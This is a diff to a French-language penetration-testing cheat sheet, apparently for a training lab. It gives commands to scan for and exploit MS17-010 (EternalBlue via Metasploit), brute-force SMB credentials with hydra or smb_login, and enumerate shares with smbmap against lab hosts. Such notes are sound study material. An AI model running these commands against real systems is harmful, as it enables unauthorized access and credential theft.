@@ -1,5 +1,5 @@
 
-# SMB
+# SMB/SAMBA
 
 ---
 
@@ -28,3 +28,15 @@ Ex : `nmap -sV -p 445 --script=smb-vuln-ms17-010 -O 10.10.10.12` permet de scann
 
 * `exploit/windows/smb/ms17_010_eternalblue` : Renseigner les paramètres (LOHST, LPORT, RHOSTS). Puis `run`  
 Si l'exploit fonctionne, nous obtenons un meterpreter.  
+
+
+
+# SAMBA
+**Brute force de credentials :**
+* `hydra -L Wordlist_users.txt -P Wordlist_passwords.txt smb://demo.ine.local -t 4`  
+  OU avec Metasploit :  
+* Le module `auxiliary/scanner/smb/smb_login` permet de bruteforcer les credentials  
+
+## smbmap
+Permet de lister les partages
+`smbmap -H demo.ine.local -u admin -p password1`
